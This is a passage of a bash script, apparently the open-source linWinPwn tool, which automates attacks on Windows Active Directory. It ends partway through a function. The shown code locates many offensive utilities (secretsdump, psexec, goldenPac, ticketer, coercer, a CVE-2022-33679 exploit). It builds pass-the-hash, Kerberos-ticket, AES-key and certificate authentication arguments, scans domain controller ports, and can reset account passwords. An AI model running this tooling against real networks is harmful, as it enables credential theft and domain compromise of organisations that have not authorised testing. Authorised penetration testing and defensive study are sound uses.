#!/bin/bash
# Title: linWinPwn
# Author: lefayjey

#Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
PURPLE='\033[1;35m'
NC='\033[0m'

#Default variables
user=""
password=""
interactive_bool=true
output_dir="$(pwd)"
wordlists_dir="/opt/lwp-wordlists"
pass_wordlist="/usr/share/wordlists/rockyou.txt"
if [ ! -f "${pass_wordlist}" ]; then pass_wordlist="${wordlists_dir}/rockyou.txt"; fi
user_wordlist="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
if [ ! -f "${user_wordlist}" ]; then user_wordlist="${wordlists_dir}/cirt-default-usernames.txt"; fi
attacker_interface="eth0"
attacker_IP=$(ip -f inet addr show $attacker_interface | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
curr_targets="Domain Controllers"
targets="DC"
custom_target_scanned=false
nullsess_bool=false
pass_bool=false
hash_bool=false
kerb_bool=false
aeskey_bool=false
cert_bool=false
autoconfig_bool=false
ldaps_bool=false
forcekerb_bool=false
verbose_bool=false

#Tools variables
scripts_dir="/opt/lwp-scripts"
netexec=$(which netexec)
impacket_findDelegation=$(which findDelegation.py)
if [ ! -f "${impacket_findDelegation}" ]; then impacket_findDelegation=$(which impacket-findDelegation); fi
impacket_GetUserSPNs=$(which GetUserSPNs.py)
if [ ! -f "${impacket_GetUserSPNs}" ]; then impacket_GetUserSPNs=$(which impacket-GetUserSPNs); fi
impacket_secretsdump=$(which secretsdump.py)
if [ ! -f "${impacket_secretsdump}" ]; then impacket_secretsdump=$(which impacket-secretsdump); fi
impacket_GetNPUsers=$(which GetNPUsers.py)
if [ ! -f "${impacket_GetNPUsers}" ]; then impacket_GetNPUsers=$(which impacket-GetNPUsers); fi
impacket_getTGT=$(which getTGT.py)
if [ ! -f "${impacket_getTGT}" ]; then impacket_getTGT=$(which impacket-getTGT); fi
impacket_goldenPac=$(which goldenPac.py)
if [ ! -f "${impacket_goldenPac}" ]; then impacket_goldenPac=$(which impacket-goldenPac); fi
impacket_rpcdump=$(which rpcdump.py)
if [ ! -f "${impacket_rpcdump}" ]; then impacket_rpcdump=$(which impacket-rpcdump); fi
impacket_reg=$(which reg.py)
if [ ! -f "${impacket_reg}" ]; then impacket_reg=$(which impacket-reg); fi
impacket_smbserver=$(which smbserver.py)
if [ ! -f "${impacket_smbserver}" ]; then impacket_smbserver=$(which impacket-smbserver); fi
impacket_ticketer=$(which ticketer.py)
if [ ! -f "${impacket_ticketer}" ]; then impacket_ticketer=$(which impacket-ticketer); fi
impacket_ticketconverter=$(which ticketConverter.py)
if [ ! -f "${impacket_ticketconverter}" ]; then impacket_ticketconverter=$(which impacket-ticketconverter); fi
impacket_getST=$(which getST.py)
if [ ! -f "${impacket_getST}" ]; then impacket_getST=$(which impacket-getST); fi
impacket_raiseChild=$(which raiseChild.py)
if [ ! -f "${impacket_raiseChild}" ]; then impacket_raiseChild=$(which impacket-raiseChild); fi
impacket_smbclient=$(which smbclient.py)
if [ ! -f "${impacket_smbclient}" ]; then impacket_smbclient=$(which impacket-smbexec); fi
impacket_smbexec=$(which smbexec.py)
if [ ! -f "${impacket_smbexec}" ]; then impacket_smbexec=$(which impacket-smbexec); fi
impacket_wmiexec=$(which wmiexec.py)
if [ ! -f "${impacket_wmiexec}" ]; then impacket_wmiexec=$(which impacket-wmiexec); fi
impacket_psexec=$(which psexec.py)
if [ ! -f "${impacket_psexec}" ]; then impacket_psexec=$(which impacket-psexec); fi
impacket_smbpasswd=$(which smbpasswd.py)
if [ ! -f "${impacket_smbpasswd}" ]; then impacket_smbpasswd=$(which impacket-smbpasswd); fi
impacket_mssqlclient=$(which mssqlclient.py)
if [ ! -f "${impacket_mssqlclient}" ]; then impacket_mssqlclient=$(which impacket-mssqlclient); fi
enum4linux_py=$(which enum4linux-ng)
if [ ! -f "${enum4linux_py}" ]; then enum4linux_py="$scripts_dir/enum4linux-ng.py"; fi
bloodhound=$(which bloodhound-python)
bloodhoundce=$(which bloodhound-python_ce)
ldapdomaindump=$(which ldapdomaindump)
smbmap=$(which smbmap)
adidnsdump=$(which adidnsdump)
certi_py=$(which certi.py)
certipy=$(which certipy)
ldeep=$(which ldeep)
pre2k=$(which pre2k)
certsync=$(which certsync)
hekatomb=$(which hekatomb)
manspider=$(which manspider)
coercer=$(which coercer)
donpapi=$(which DonPAPI)
bloodyad=$(which bloodyAD)
mssqlrelay=$(which mssqlrelay)
kerbrute="$scripts_dir/kerbrute"
silenthound="$scripts_dir/silenthound.py"
windapsearch="$scripts_dir/windapsearch"
CVE202233679="$scripts_dir/CVE-2022-33679.py"
targetedKerberoast="$scripts_dir/targetedKerberoast.py"
FindUncommonShares="$scripts_dir/FindUncommonShares.py"
ExtractBitlockerKeys="$scripts_dir/ExtractBitlockerKeys.py"
ldapconsole="$scripts_dir/ldapconsole.py"
pyLDAPmonitor="$scripts_dir/pyLDAPmonitor.py"
LDAPWordlistHarvester="$scripts_dir/LDAPWordlistHarvester.py"
rdwatool=$(which rdwatool)
aced="$scripts_dir/aced-main/aced.py"
sccmhunter="$scripts_dir/sccmhunter-main/sccmhunter.py"
ldapper="$scripts_dir/ldapper/ldapper.py"
orpheus="$scripts_dir/orpheus-main/orpheus.py"
krbjack=$(which krbjack)
adalanche="$scripts_dir/adalanche"
pygpoabuse="$scripts_dir/pyGPOAbuse-master/pygpoabuse.py"
GPOwned="$scripts_dir/GPOwned.py"
privexchange="$scripts_dir/privexchange.py"
RunFinger="$scripts_dir/Responder/RunFinger.py"
ADCheck="$scripts_dir/ADcheck/ADcheck.py"
adPEAS=$(which adPEAS)
breads=$(which breads-ad)
smbclientng=$(which smbclientng)
evilwinrm=$(which evil-winrm)
ldapnomnom="$scripts_dir/ldapnomnom"
nmap=$(which nmap)
john=$(which john)
python3=$(which python3)

print_banner() {
    echo -e "
       _        __        ___       ____                  
      | |(_)_ __\ \      / (_)_ __ |  _ \__      ___ __   
      | || | '_  \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \  
      | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
      |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 

      ${BLUE}linWinPwn: ${CYAN}version 1.0.16 ${NC}
      https://github.com/lefayjey/linWinPwn
      ${BLUE}Author: ${CYAN}lefayjey${NC}
      ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
"
}

help_linWinPwn() {
    print_banner
    echo -e "${YELLOW}Parameters${NC}"
    echo -e "-h/--help           Show the help message"
    echo -e "-t/--target         IP Address of Target Domain Controller ${RED}[MANDATORY]${NC}"
    echo -e "-d/--domain         Domain of user (default: empty)"
    echo -e "-u/--username       Username (default: empty)"
    echo -e "-p                  Password (NTLM authentication only) (default: empty)"
    echo -e "-H                  LM:NT (NTLM authentication only) (default: empty)"
    echo -e "-K                  Location to Kerberos ticket './krb5cc_ticket' (Kerberos authentication only) (default: empty)"
    echo -e "-A                  AES Key (Kerberos authentication only) (default: empty)"
    echo -e "-C                  Location to PFX Certificate './cert.pfx' (default: empty)"
    echo -e "--cert-pass         Password of provided PFX Certificate (optional)"
    echo -e "--auto              Run automatic enumeration"
    echo -e "-o/--output         Output directory (default: current dir)"
    echo -e "--auto-config       Run NTP sync with target DC and adds entry to /etc/hosts"
    echo -e "--ldaps             Use LDAPS instead of LDAP (port 636)"
    echo -e "--force-kerb        Use Kerberos authentication instead of NTLM when possible (requires password or NTLM hash)"
    echo -e "--verbose           Enable all verbose and debug outputs"
    echo -e "-I/--interface      Attacker's network interface (default: eth0)"
    echo -e "-T/--targets        Target systems for Vuln Scan, SMB Scan and Pwd Dump (default: Domain Controllers)"
    echo -e "-U/--userwordlist   Custom username list used during Null session checks"
    echo -e "-P/--passwordlist   Custom password list used during password cracking"
    echo -e "     ${CYAN}Choose between:${NC} DC (Domain Controllers), All (All domain servers), File='path_to_file' (File containing list of servers), IP='IP_or_hostname' (IP or hostname)"
    echo -e ""
    echo -e "${YELLOW}Example usages${NC}"
    echo -e "$(pwd)/$(basename "$0") -t dc_ip ${CYAN}(No password for anonymous login)${NC}" >&2
    echo -e "$(pwd)/$(basename "$0") -t dc_ip -d domain -u user [-p password or -H hash or -K kerbticket]" >&2
    echo -e ""
}

args=()
while test $# -gt 0; do
    case $1 in
    -t | --target)
        dc_ip="${2}"
        shift
        ;; #mandatory
    -d | --domain)
        domain="${2}"
        shift
        ;;
    -u | --user)
        user="${2}"
        shift
        ;; #leave empty for anonymous login
    -p)
        password="${2}"
        if [ ! "${password}" == "" ]; then pass_bool=true; fi
        shift
        ;; #password
    -H)
        hash="${2}"
        if [ ! "${hash}" == "" ]; then hash_bool=true; fi
        shift
        ;; #NTLM hash
    -K)
        krb5cc="${2}"
        if [ ! "${krb5cc}" == "" ]; then kerb_bool=true; fi
        shift
        ;; #location of krb5cc ticket
    -A)
        aeskey="${2}"
        if [ ! "${aeskey}" == "" ]; then aeskey_bool=true; fi
        shift
        ;; #AES Key (128 or 256 bits)
    -C)
        pfxcert="${2}"
        if [ ! "${pfxcert}" == "" ]; then cert_bool=true; fi
        shift
        ;; #location of PFX certificate
    --cert-pass)
        pfxpass="${2}"
        shift
        ;; #Password of PFX certificate
    -o)
        output_dir="$(realpath "${2}")"
        shift
        ;;
    --output)
        output_dir="$(realpath "${2}")"
        shift
        ;;
    -I | --interface)
        attacker_IP="$(ip -f inet addr show "${2}" | sed -En 's/.*inet ([0-9.]+).*/\1/p')"
        attacker_interface="${2}"
        shift
        ;;
    -T | --targets)
        targets="${2}"
        shift
        ;;
    -U | --userwordlist)
        user_wordlist="${2}"
        shift
        ;;
    -P | --passwordlist)
        pass_wordlist="${2}"
        shift
        ;;
    --auto)
        interactive_bool=false
        args+=("$1")
        ;; #auto mode, disable interactive
    --auto-config)
        autoconfig_bool=true
        args+=("$1")
        ;;
    --ldaps)
        ldaps_bool=true
        args+=("$1")
        ;;
    --force-kerb)
        forcekerb_bool=true
        args+=("$1")
        ;;
    --verbose)
        verbose_bool=true
        args+=("$1")
        ;;
    -h | --help)
        help_linWinPwn
        exit
        ;;
    *)
        print_banner
        echo -e "${RED}[-] Unknown option:${NC} ${1}"
        echo -e "Use -h for help"
        exit 1
        ;;
    esac
    shift
done
set -- "${args[@]}"

run_command() {
    echo "$(date +%Y-%m-%d\ %H:%M:%S); $*" >>"$command_log"
    /usr/bin/script -qc "$@" /dev/null
}

prepare() {
    if [ -z "$dc_ip" ]; then
        echo -e "${RED}[-] Missing target... ${NC}"
        if [ -n "$domain" ]; then
            dig_ip=$(dig +short "${domain}")
            if [ -n "$dig_ip" ]; then echo -e "${YELLOW}[i]${NC} Provided domain resolves to ${dig_ip}! Try again with ${YELLOW}-t $dig_ip${NC}"; fi
        fi
        echo -e "${YELLOW}[i]${NC} Use -h for more help"
        exit 1
    elif [[ ! $dc_ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo -e "${RED}[-] Target is not an IP address... ${NC}"
        dig_ip=$(dig +short "${dc_ip}")
        if [ -n "$dig_ip" ]; then echo -e "${YELLOW}[i]${NC} Provided target resolves to ${dig_ip}! Try again with ${YELLOW}-t $dig_ip${NC}"; fi

        if [ -n "$domain" ]; then
            dig_ip=$(dig +short "${domain}")
            if [ -n "$dig_ip" ]; then echo -e "${YELLOW}[i]${NC} Provided domain resolves to ${dig_ip}! Try again with ${YELLOW}-t $dig_ip${NC}"; fi
        fi
        echo -e "${YELLOW}[i]${NC} Use -h for more help"
        exit 1
    fi

    echo -e "${GREEN}[+] $(date)${NC}"

    if [ ! -f "${netexec}" ]; then
        echo -e "${RED}[-] Please ensure netexec is installed and try again... ${NC}"
        exit 1
    else
        dc_info=$(${netexec} smb "${dc_ip}")
    fi

    dc_NETBIOS=$(echo "$dc_info" | cut -d ":" -f 2 | sed "s/) (domain//g" | head -n 1)
    dc_domain=$(echo "$dc_info" | cut -d ":" -f 3 | sed "s/) (signing//g" | head -n 1)
    dc_FQDN=${dc_NETBIOS}"."${dc_domain}

    if [ -z "$dc_info" ]; then
        echo -e "${RED}[-] Error connecting to target! Please ensure the target is a Domain Controller and try again... ${NC}"
        exit 1
    elif [ -z "$dc_domain" ]; then
        echo -e "${RED}[-] Error finding DC's domain, please specify domain... ${NC}"
        exit 1
    else
        if [ -z "$domain" ]; then domain=$dc_domain; fi
    fi

    dc_open_ports=$(${nmap} -n -Pn -p 135,445,389,636 "${dc_ip}" -sT -T5 --open)
    if [[ $dc_open_ports == *"135/tcp"* ]]; then dc_port_135="${GREEN}open${NC}"; else dc_port_135="${RED}filtered|closed${NC}"; fi
    if [[ $dc_open_ports == *"445/tcp"* ]]; then dc_port_445="${GREEN}open${NC}"; else dc_port_445="${RED}filtered|closed${NC}"; fi
    if [[ $dc_open_ports == *"389/tcp"* ]]; then dc_port_389="${GREEN}open${NC}"; else dc_port_389="${RED}filtered|closed${NC}"; fi
    if [[ $dc_open_ports == *"636/tcp"* ]]; then dc_port_636="${GREEN}open${NC}"; else dc_port_636="${RED}filtered|closed${NC}"; fi

    if [ "${autoconfig_bool}" == true ]; then
        echo -e "${BLUE}[*] NTP and /etc/hosts auto-config... ${NC}"
        sudo timedatectl set-ntp 0
        sudo ntpdate "${dc_ip}"
        if ! grep -q "${dc_ip}" "/etc/hosts" >/dev/null 2>&1; then
            echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
            echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
        else
            echo -e "${PURPLE}[-] Target IP already present in /etc/hosts... ${NC}"
        fi
    fi

    if [ "${user}" == "" ]; then user_out="null"; else user_out=${user// /}; fi
    output_dir="${output_dir}/linWinPwn_${dc_domain}_${user_out}"
    command_log="$output_dir/$(date +%Y-%m-%d)_command.log"
    servers_ip_list="${output_dir}/DomainRecon/Servers/ip_list_${dc_domain}.txt"
    dc_ip_list="${output_dir}/DomainRecon/Servers/dc_ip_list_${dc_domain}.txt"
    sql_ip_list="${output_dir}/DomainRecon/Servers/sql_ip_list_${dc_domain}.txt"
    servers_hostname_list="${output_dir}/DomainRecon/Servers/servers_list_${dc_domain}.txt"
    dc_hostname_list="${output_dir}/DomainRecon/Servers/dc_list_${dc_domain}.txt"
    sql_hostname_list="${output_dir}/DomainRecon/Servers/sql_list_${dc_domain}.txt"
    custom_servers_list="${output_dir}/DomainRecon/Servers/custom_servers_list_${dc_domain}.txt"
    target=${dc_ip}
    target_servers=${servers_ip_list}
    target_dc=${dc_ip_list}
    target_sql=${sql_ip_list}

    mkdir -p "${output_dir}/ADCS"
    mkdir -p "${output_dir}/BruteForce"
    mkdir -p "${output_dir}/Credentials"
    mkdir -p "${output_dir}/CommandExec"
    mkdir -p "${output_dir}/DomainRecon/Servers"
    mkdir -p "${output_dir}/DomainRecon/Users"
    mkdir -p "${output_dir}/Kerberos"
    mkdir -p "${output_dir}/Modification"
    mkdir -p "${output_dir}/Scans"
    mkdir -p "${output_dir}/Shares"
    mkdir -p "${output_dir}/Vulnerabilities"
    mkdir -p "${output_dir}/Exploitation"

    if [ ! -f "${servers_ip_list}" ]; then /bin/touch "${servers_ip_list}"; fi
    if [ ! -f "${servers_hostname_list}" ]; then /bin/touch "${servers_hostname_list}"; fi
    if [ ! -f "${dc_ip_list}" ]; then /bin/touch "${dc_ip_list}"; fi
    if [ ! -f "${dc_hostname_list}" ]; then /bin/touch "${dc_hostname_list}"; fi

    if [ ! -f "${user_wordlist}" ]; then
        echo -e "${RED}[-] Users list file not found${NC}"
    fi

    if [ ! -f "${pass_wordlist}" ]; then
        echo -e "${RED}[-] Passwords list file not found${NC}"
    fi

    echo -e ""

    if [[ $targets == "DC" ]]; then
        curr_targets="Domain Controllers"
    elif [[ $targets == "All" ]]; then
        curr_targets="All domain servers"
    elif [[ $targets == "File="* ]]; then
        curr_targets="File containing list of servers"
        /bin/rm "${custom_servers_list}" 2>/dev/null
        custom_servers=$(echo "$targets" | cut -d "=" -f 2)
        /bin/cp "${custom_servers}" "${custom_servers_list}" 2>/dev/null
        if [ ! -s "${custom_servers_list}" ]; then
            echo -e "${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead."
            curr_targets="Domain Controllers"
            custom_servers=""
        fi
    elif [[ $targets == "IP="* ]]; then
        curr_targets="IP or hostname"
        custom_ip=$(echo "$targets" | cut -d "=" -f 2)
        /bin/rm "${custom_servers_list}" 2>/dev/null
        echo -n "$custom_ip" >"${custom_servers_list}" 2>/dev/null
        if [ ! -s "${custom_servers_list}" ]; then
            echo -e "${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead."
            curr_targets="Domain Controllers"
            custom_ip=""
        fi
    else
        echo -e "${RED}[-] Error invalid targets parameter. Choose between DC, All, File='./custom_list' or IP=IP_or_hostname... ${NC}"
        exit 1
    fi
}

authenticate() {
    #Check if null session or empty password is used
    if [ "${pass_bool}" == false ] && [ "${hash_bool}" == false ] && [ "${kerb_bool}" == false ] && [ "${aeskey_bool}" == false ] && [ "${cert_bool}" == false ]; then
        if [ ! "${user}" == "" ]; then
            echo -e "${RED}[i]${NC} Please specify password, NTLM hash, Kerberos ticket, AES key or certificate and try again..."
            exit 1
        else
            nullsess_bool=true
            rand_user=$(
                tr -dc A-Za-z0-9 </dev/urandom | head -c 10
                echo
            )
            argument_ne="-d ${domain} -u '' -p ''"
            argument_smbmap="-d ${domain} -u '' -p ''"
            argument_manspider="-d ${domain} -u '' -p ''"
            argument_coercer="-d ${domain} -u '' -p ''"
            argument_bloodyad="-d ${domain} -u '' -p ''"
            argument_privexchange="-d ${domain} -u '' -p ''"
            argument_windap="-d ${domain}"
            argument_adidns=""
            argument_ldd=""
            argument_silenthd=""
            argument_enum4linux=""
            argument_imp="${domain}/"
            argument_imp_gp="${domain}/"
            argument_ldeep="-d ${dc_domain} -a"
            argument_pre2k="-d ${domain}"
            argument_p0dalirius="-d ${domain} -u Guest -p ''"
            argument_FindUncom="-ad ${domain} -au Guest -ap ''"
            auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}null session ${NC}"
        fi

    #Check if username is not provided
    elif [ "${user}" == "" ]; then
        echo -e "${RED}[i]${NC} Please specify username and try again..."
        exit 1
    fi

    #Check if password is used
    if [ "${pass_bool}" == true ]; then
        argument_ne="-d ${domain} -u ${user} -p '${password}'"
        argument_imp="${domain}/${user}:'${password}'"
        argument_imp_gp="${domain}/${user}:'${password}'"
        argument_imp_ti="-user ${user} -password '${password}' -domain ${domain}"
        argument_bhd="-u ${user}\\@${domain} -p '${password}' --auth-method ntlm"
        argument_enum4linux="-w ${domain} -u ${user} -p '${password}'"
        argument_adidns="-u ${domain}\\\\${user} -p '${password}'"
        argument_ldd="-u ${domain}\\\\${user} -p '${password}'"
        argument_smbmap="-d ${domain} -u ${user} -p '${password}'"
        argument_certi_py="${domain}/${user}:'${password}'"
        argument_certipy="-u ${user}\\@${domain} -p '${password}'"
        argument_ldeep="-d ${domain} -u ${user} -p '${password}'"
        argument_pre2k="-d ${domain} -u ${user} -p '${password}'"
        argument_certsync="-d ${domain} -u ${user} -p '${password}'"
        argument_donpapi="${domain}/${user}:'${password}'"
        argument_hekatomb="${domain}/${user}:'${password}'"
        argument_silenthd="-u ${domain}\\\\${user} -p '${password}'"
        argument_windap="-d ${domain} -u ${user} -p '${password}'"
        argument_targkerb="-d ${domain} -u ${user} -p '${password}'"
        argument_p0dalirius="-d ${domain} -u ${user} -p '${password}'"
        argument_FindUncom="-ad ${domain} -au ${user} -ap '${password}'"
        argument_manspider="-d ${domain} -u ${user} -p '${password}'"
        argument_coercer="-d ${domain} -u ${user} -p '${password}'"
        argument_bloodyad="-d ${domain} -u ${user} -p '${password}'"
        argument_aced="${domain}/${user}:'${password}'"
        argument_sccm="-d ${domain} -u ${user} -p '${password}'"
        argument_ldapper="-D ${domain} -U ${user} -P '${password}'"
        argument_adalanche="--authmode ntlm --username ${user}\\@${domain} --password '${password}'"
        argument_mssqlrelay="-u ${user}\\@${domain} -p '${password}'"
        argument_pygpoabuse="${domain}/${user}:'${password}''"
        argument_GPOwned="-d ${domain} -u ${user} -p '${password}'"
        argument_privexchange="-d ${domain} -u ${user} -p '${password}'"
        argument_adpeas="-d ${domain} -u ${user} -p '${password}'"
        argument_adcheck="-d ${domain} -u ${user} -p '${password}'"
        argument_evilwinrm="-u ${user} -p '${password}'"
        hash_bool=false
        kerb_bool=false
        unset KRB5CCNAME
        aeskey_bool=false
        cert_bool=false
        auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}password of ${user}${NC}"
    fi

    #Check if NTLM hash is used, and complete with empty LM hash / Check if Certificate is provided for PKINIT
    if [ "${hash_bool}" == true ] || [ "${cert_bool}" == true ]; then
        if [ "${cert_bool}" == true ]; then
            echo -e "${YELLOW}[!]${NC} WARNING only ldeep and bloodyAD currently support certificate authentication.${NC}"
            echo -e "${YELLOW}[!]${NC} Extracting the NTLM hash of the user using PKINIT and using PtH for all other tools${NC}"
            pkinit_auth
            $(which openssl) pkcs12 -in "${pfxcert}" -out "${output_dir}/Credentials/${user}.pem" -nodes -passin pass:""
            if [ -f "${output_dir}/Credentials/${user}.pem" ]; then
                pem_cert="${output_dir}/Credentials/${user}.pem"
                echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} ${output_dir}/Credentials/${user}.pem"
            fi
            argument_bloodyad="-d ${domain} -u ${user} -c :${pem_cert}"
            argument_ldeep="-d ${domain} -u ${user} --pfx-file ${pfxcert}"
            argument_evilwinrm="-u ${user} -k ${pem_cert}"
            auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Certificate of $user located at $(realpath "$pfxcert")${NC}"
            hash_bool=true
        else
            if [[ (${#hash} -eq 65 && "${hash:32:1}" == ":") || (${#hash} -eq 33 && "${hash:0:1}" == ":") || (${#hash} -eq 32) ]]; then
                if [ "$(echo "$hash" | grep ':')" == "" ]; then
                    hash=":"$hash
                fi
                if [ "$(echo "$hash" | cut -d ":" -f 1)" == "" ]; then
                    hash="aad3b435b51404eeaad3b435b51404ee"$hash
                fi
                argument_ne="-d ${domain} -u ${user} -H ${hash}"
                argument_imp=" -hashes ${hash} ${domain}/${user}"
                argument_imp_gp=" -hashes ${hash} ${domain}/${user}"
                argument_imp_ti="-user ${user} -hashes ${hash} -domain ${domain}"
                argument_bhd="-u ${user}\\@${domain} --hashes ${hash} --auth-method ntlm"
                argument_enum4linux="-w ${domain} -u ${user} -H ${hash:33}"
                argument_adidns="-u ${domain}\\\\${user} -p ${hash}"
                argument_ldd="-u ${domain}\\\\${user} -p ${hash}"
                argument_smbmap="-d ${domain} -u ${user} -p ${hash}"
                argument_certi_py="${domain}/${user} --hashes ${hash}"
                argument_certipy="-u ${user}\\@${domain} -hashes ${hash}"
                argument_pre2k="-d ${domain} -u ${user} -hashes ${hash}"
                argument_certsync="-d ${domain} -u ${user} -hashes ${hash}"
                argument_donpapi=" -H ${hash} ${domain}/${user}"
                argument_hekatomb="-hashes ${hash} ${domain}/${user}"
                argument_silenthd="-u ${domain}\\\\${user} --hashes ${hash}"
                argument_windap="-d ${domain} -u ${user} --hash ${hash}"
                argument_targkerb="-d ${domain} -u ${user} -H ${hash}"
                argument_p0dalirius="-d ${domain} -u ${user} -H ${hash:33})"
                argument_FindUncom="-ad ${domain} -au ${user} -ah ${hash}"
                argument_manspider="-d ${domain} -u ${user} -H ${hash:33}"
                argument_coercer="-d ${domain} -u ${user} --hashes ${hash}"
                argument_aced=" -hashes ${hash} ${domain}/${user}"
                argument_sccm="-d ${domain} -u ${user} -hashes ${hash}"
                argument_ldapper="-D ${domain} -U ${user} -P ${hash}"
                argument_ldeep="-d ${domain} -u ${user} -H ${hash}"
                argument_bloodyad="-d ${domain} -u ${user} -p ${hash}"
                argument_adalanche="--authmode ntlmpth --username ${user}\\@${domain} --password ${hash}"
                argument_mssqlrelay="-u ${user}\\@${domain} -hashes ${hash}"
                argument_pygpoabuse=" -hashes ${hash} ${domain}/${user}"
                argument_GPOwned="-d ${domain} -u ${user} -hashes ${hash}"
                argument_privexchange="-d ${domain} -u ${user} --hashes ${hash}"
                argument_adcheck="-d ${domain} -u ${user} -H ${hash}"
                argument_evilwinrm="-u ${user} -H ${hash:33}"
                auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of ${user}${NC}"
            else
                echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
                exit 1
            fi
        fi
        pass_bool=false
        kerb_bool=false
        unset KRB5CCNAME
        aeskey_bool=false
    fi

    #Check if kerberos ticket is used
    if [ "${kerb_bool}" == true ]; then
        argument_ne="-d ${domain} -u ${user} --use-kcache"
        pass_bool=false
        hash_bool=false
        aeskey_bool=false
        cert_bool=false
        forcekerb_bool=false
        if [ -f "${krb5cc}" ]; then
            target=${dc_FQDN}
            target_dc=${dc_hostname_list}
            target_sql=${sql_hostname_list}
            target_servers=${servers_hostname_list}
            krb5cc_path=$(realpath "$krb5cc")
            export KRB5CCNAME=$krb5cc_path
            argument_imp="-k -no-pass ${domain}/${user}"
            argument_enum4linux="-w ${domain} -u ${user} -K ${krb5cc}"
            argument_bhd="-u ${user}\\@${domain} -k -no-pass -p '' --auth-method kerberos"
            argument_certi_py="${domain}/${user} -k --no-pass"
            argument_certipy="-u ${user}\\@${domain} -k -no-pass -target ${dc_FQDN}"
            argument_ldeep="-d ${domain} -u ${user} -k"
            argument_pre2k="-d ${domain} -u ${user} -k -no-pass"
            argument_certsync="-d ${domain} -u ${user} -use-kcache -no-pass -k"
            argument_donpapi="-k -no-pass ${domain}/${user}"
            argument_targkerb="-d ${domain} -u ${user} -k --no-pass"
            argument_p0dalirius="-d ${domain} -u ${user} -k --no-pass"
            argument_FindUncom="-ad ${domain} -au ${user} -k --no-pass"
            argument_bloodyad="-d ${domain} -u ${user} -k"
            argument_aced="-k -no-pass ${domain}/${user}"
            argument_sccm="-d ${domain} -u ${user} -k --no-pass"
            argument_mssqlrelay="-u ${user}\\@${domain} -k -no-pass"
            argument_pygpoabuse="${domain}/${user} -k -ccache $(realpath "$krb5cc")"
            argument_evilwinrm="-r ${domain} -u ${user}"
            auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Kerberos Ticket of $user located at $(realpath "$krb5cc")${NC}"
        else
            echo -e "${RED}[i]${NC} Error accessing provided Kerberos ticket $(realpath "$krb5cc")..."
            exit 1
        fi
    fi

    #Check if kerberos AES key is used
    if [ "${aeskey_bool}" == true ]; then
        target=${dc_FQDN}
        target_dc=${dc_hostname_list}
        target_sql=${sql_hostname_list}
        target_servers=${servers_hostname_list}
        argument_ne="-d ${domain} -u ${user} --aesKey ${aeskey}"
        argument_imp="-aesKey ${aeskey} ${domain}/${user}"
        argument_bhd="-u ${user}\\@${domain} -aesKey ${aeskey} --auth-method kerberos"
        argument_certi_py="${domain}/${user} --aes ${aeskey} -k"
        argument_certipy="-u ${user}\\@${domain} -aes ${aeskey} -target ${dc_FQDN}"
        argument_pre2k="-d ${domain} -u ${user} -aes ${aeskey} -k"
        argument_certsync="-d ${domain} -u ${user} -aesKey ${aeskey} -k"
        argument_donpapi="-k -aesKey ${aeskey} ${domain}/${user}"
        argument_targkerb="-d ${domain} -u ${user} --aes-key ${aeskey} -k"
        argument_p0dalirius="-d ${domain} -u ${user} --aes-key ${aeskey} -k"
        argument_FindUncom="-ad ${domain} -au ${user} --aes-key ${aeskey} -k"
        argument_aced="-aes ${aeskey} ${domain}/${user}"
        argument_sccm="-d ${domain} -u ${user} -aes ${aeskey}"
        argument_mssqlrelay="-u ${user}\\@${domain} -aes ${aeskey} -k"
        pass_bool=false
        hash_bool=false
        kerb_bool=false
        unset KRB5CCNAME
        cert_bool=false
        forcekerb_bool=false
        auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}AES Kerberos key of ${user}${NC}"
    fi

    #Perform authentication using provided credentials
    if [ "${nullsess_bool}" == false ]; then
        auth_check=$(run_command "${netexec} smb ${target} ${argument_ne}" 2>&1 | grep "\[-\]\|Traceback" -A 10 2>&1)
        if [ -n "$auth_check" ]; then
            echo "$auth_check"
            if [[ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ]] || [[ $auth_check == *"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"* ]]; then
                if [ ! -f "${impacket_smbpasswd}" ]; then
                    echo -e "${RED}[-] smbpasswd.py not found! Please verify the installation of impacket${NC}"
                elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
                    echo -e "${PURPLE}[-] smbpasswd does not support Kerberos authentication${NC}"
                else
                    pass_passchange=""
                    if [[ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ]]; then
                        echo -e "${BLUE}[*] Changing expired password of own user. Please specify new password:${NC}"
                        read -rp ">> " pass_passchange </dev/tty
                        while [ "${pass_passchange}" == "" ]; do
                            echo -e "${RED}Invalid password.${NC} Please specify password:"
                            read -rp ">> " pass_passchange </dev/tty
                        done
                        echo -e "${CYAN}[*] Changing password of ${user} to ${pass_passchange}${NC}"
                        run_command "${impacket_smbpasswd} ${argument_imp}\\@${dc_ip} -newpass ${pass_passchange}" | tee -a "${output_dir}/Modification/impacket_smbpasswd_${dc_domain}.txt"
                    elif [[ $auth_check == *"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"* ]]; then
                        echo -e "${BLUE}[*] Changing password of pre created computer account. Please specify new password:${NC}"
                        read -rp ">> " pass_passchange </dev/tty
                        while [ "${pass_passchange}" == "" ]; do
                            echo -e "${RED}Invalid password.${NC} Please specify password:"
